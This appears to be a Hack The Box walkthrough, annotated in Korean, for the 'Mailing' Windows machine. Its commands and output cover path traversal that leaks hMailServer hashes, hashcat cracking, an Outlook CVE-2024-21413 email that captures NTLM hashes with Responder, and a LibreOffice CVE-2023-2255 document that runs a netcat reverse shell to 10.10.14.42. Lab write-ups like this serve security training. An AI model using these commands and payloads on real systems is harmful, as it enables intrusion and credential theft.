## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ nnmap 10.129.232.39                                             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 11:31 +0900
Nmap scan report for 10.129.232.39
Host is up (0.24s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: OK SORT QUOTA NAMESPACE CAPABILITY IMAP4rev1 ACL IMAP4 IDLE completed RIGHTS=texkA0001 CHILDREN
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp   open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp   open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_imap-capabilities: OK SORT QUOTA NAMESPACE CAPABILITY IMAP4rev1 ACL IMAP4 IDLE completed RIGHTS=texkA0001 CHILDREN
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
56628/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Microsoft Windows 10 1909 - 2004 (91%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-16T00:09:48
|_  start_date: N/A
|_clock-skew: -2h25m14s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   244.21 ms 10.10.14.1
2   244.48 ms 10.129.232.39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 250.08 seconds

```

hMailServer 사용

Download Instructions 클릭 시 Path Traversal 취약점 발생

```bash
┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ curl http://mailing.htb/download.php?file=../../../../../../../Windows/System32/drivers/etc/hosts
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost

127.0.0.1       mailing.htb

```

취약점 활용하여 hMailServer 설정 파일 확인
두 개의 해시값 획득
`841bb5acfa6779ae432fd7a4e6600ba7, 0a9f8ad8bf896b501dde74f08efd7e4c`
```bash
curl 'http://mailing.htb/download.php?file=../../../../../../../Program%20Files%20%28x86%29/hMailServer/Bin/hMailServer.ini'
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1

```

hashcat 모드 확인
```bash
┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ hashcat admin.hash                                             
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

The following 12 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
  32800 | md5(sha1(md5($pass)))                                      | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)

Please specify the hash-mode with -m [hash-mode].

Started: Mon Mar 16 11:48:57 2026
Stopped: Mon Mar 16 11:49:02 2026

```


해시 크랙
 ```bash
 ┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt --quiet
841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator

 ```

IMAP 로그인 성공하였으나, 발견된 메일 없음
```bash
┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ telnet 10.129.9.213 143 
Trying 10.129.9.213...
Connected to 10.129.9.213.
Escape character is '^]'.
* OK IMAPrev1
LOGIN administrator@mailing.htb homenetworkingadministrator
LOGIN BAD Unknown or NULL command
A1 LOGIN administrator@mailing.htb homenetworkingadministrator
A1 OK LOGIN completed
A2 LIST "" *
* LIST (\HasNoChildren) "." "INBOX"
A2 OK LIST completed
A1 SELECT INBOX
* 0 EXISTS
* 0 RECENT
* FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
* OK [UIDVALIDITY 1709316818] current uidvalidity
* OK [UIDNEXT 1] next uid
* OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
A1 OK [READ-WRITE] SELECT completed

```


로컬 NTLM 자격증명 탈취 가능한 POC 다운로드
 https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability 

┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability 
Cloning into 'CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 28 (delta 7), reused 6 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (28/28), 14.48 KiB | 14.48 MiB/s, done.
Resolving deltas: 100% (7/7), done.


POC 코드 실행



```bash
┌──(kali㉿kali)-[~/HTB/Mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
└─$ python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender QQ@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.42\share\sploit" --subject "Check this out ASAP!"   
dquote> "

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de                                                                       

✅ Email sent successfully.


```

Responder 실행 후 대기하면 maya NLTM 해시 획득

```bash
┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.42]
    Responder IPv6             [dead:beef:2::1028]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-NH4Q24OIZOP]
    Responder Domain Name      [E4F5.LOCAL]
    Responder DCE-RPC Port     [46182]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                         

[SMB] NTLMv2-SSP Client   : 10.129.9.213
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash     : maya::MAILING:8edd94397a678c6e:92CC0FEC1896193F093373D7E1E422FE:0101000000000000808759F63CB5DC01119D23844020B7670000000002000800450034004600350001001E00570049004E002D004E00480034005100320034004F0049005A004F00500004003400570049004E002D004E00480034005100320034004F0049005A004F0050002E0045003400460035002E004C004F00430041004C000300140045003400460035002E004C004F00430041004C000500140045003400460035002E004C004F00430041004C0007000800808759F63CB5DC010600040002000000080030003000000000000000000000000020000050678D3B1E50166383F1C050E06496541C13B5E03A5CB4C6AE0EC9754C17C03F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340032000000000000000000                                                                                            
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya
[*] Skipping previously captured hash for MAILING\maya


```

hash  크랙
```bassh
┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ hashcat maya.hash /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 6970/13940 MB (2048 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (12347 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

MAYA::MAILING:8edd94397a678c6e:92cc0fec1896193f093373d7e1e422fe:0101000000000000808759f63cb5dc01119d23844020b7670000000002000800450034004600350001001e00570049004e002d004e00480034005100320034004f0049005a004f00500004003400570049004e002d004e00480034005100320034004f0049005a004f0050002e0045003400460035002e004c004f00430041004c000300140045003400460035002e004c004f00430041004c000500140045003400460035002e004c004f00430041004c0007000800808759f63cb5dc010600040002000000080030003000000000000000000000000020000050678d3b1e50166383f1c050e06496541c13b5e03a5cb4c6ae0ec9754c17c03f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340032000000000000000000:m4y4ngs4ri

```

획득한 자격증명으로 evil-winrm 접속

```bash
┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri     
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents> 

```


user.txt 획득
![[Pasted image 20260316095519.png]]

Prievege Escalation

SMB를 통해 "Important Documents" 발견
```bash
┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ nxc smb mailing.htb -u maya -p m4y4ngs4ri --shares
SMB         10.129.9.213    445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.129.9.213    445    MAILING          [+] MAILING\maya:m4y4ngs4ri 
SMB         10.129.9.213    445    MAILING          [*] Enumerated shares
SMB         10.129.9.213    445    MAILING          Share           Permissions     Remark
SMB         10.129.9.213    445    MAILING          -----           -----------     ------
SMB         10.129.9.213    445    MAILING          ADMIN$                          Admin remota
SMB         10.129.9.213    445    MAILING          C$                              Recurso predeterminado
SMB         10.129.9.213    445    MAILING          Important Documents READ,WRITE      
SMB         10.129.9.213    445    MAILING          IPC$            READ            IPC remota

```

Program Files안에 LibreOffice설치된 것을 확인
```bash
*Evil-WinRM* PS C:\Program Files> ls


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/27/2024   5:30 PM                Common Files
d-----          3/3/2024   4:40 PM                dotnet
d-----          3/3/2024   4:32 PM                Git
d-----         4/29/2024   6:54 PM                Internet Explorer
d-----          3/4/2024   6:57 PM                LibreOffice
d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
d-----         2/27/2024   4:58 PM                MSBuild
d-----         2/27/2024   5:30 PM                OpenSSL-Win64
d-----         3/13/2024   4:49 PM                PackageManagement
d-----         2/27/2024   4:58 PM                Reference Assemblies
d-----         3/13/2024   4:48 PM                RUXIM
d-----         2/27/2024   4:32 PM                VMware

```

POC 다운로드
https://github.com/elweth-sec/CVE-2023-2255

```bash
┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ git clone https://github.com/elweth-sec/CVE-2023-2255 
Cloning into 'CVE-2023-2255'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 10 (delta 2), reused 5 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (10/10), 8.47 KiB | 8.47 MiB/s, done.
Resolving deltas: 100% (2/2), done.


```

exploit.odt 파일 업로드
```bash
*Evil-WinRM* PS C:\Important Documents> upload exploit.odt
                                        
Info: Uploading /home/kali/HTB/Mailing/CVE-2023-2255/exploit.odt to C:\Important Documents\exploit.odt
                                        
Data: 40736 bytes of 40736 bytes copied
                                        
Info: Upload successful!

```

nc64.exe 업로드
```bash

*Evil-WinRM* PS C:\ProgramData> upload nc64.exe
                                        
Info: Uploading /home/kali/HTB/Mailing/CVE-2023-2255/nc64.exe to C:\ProgramData\nc64.exe
                                        
Data: 60360 bytes of 60360 bytes copied
                                        
Info: Upload successful!

```

nc 대기 후 페이로드 실행
```bash
┌──(kali㉿kali)-[~/HTB/Mailing/CVE-2023-2255]
└─$ python CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.14.42 4444' --output exploit.odt
File exploit.odt has been created !

```

리버스쉘 획득
```bash
┌──(kali㉿kali)-[~/HTB/Mailing]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.9.213] 50279
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice\program>whoami
whoami
mailing\localadmin

```

root.txt 획득
```powershell
c:\Users\localadmin\Desktop>type root.txt
type root.txt
df28eeb2990c66310cc386834e7e6736

c:\Users\localadmin\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::17c
   IPv6 Address. . . . . . . . . . . : dead:beef::f770:9e75:ea0f:62bb
   Temporary IPv6 Address. . . . . . : dead:beef::bc72:c797:d2ea:4398
   Link-local IPv6 Address . . . . . : fe80::8d4e:6cc4:6368:7ff7%14
   IPv4 Address. . . . . . . . . . . : 10.129.9.213
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%14
                                       10.129.0.1


```
![[Pasted image 20260316103122.png]]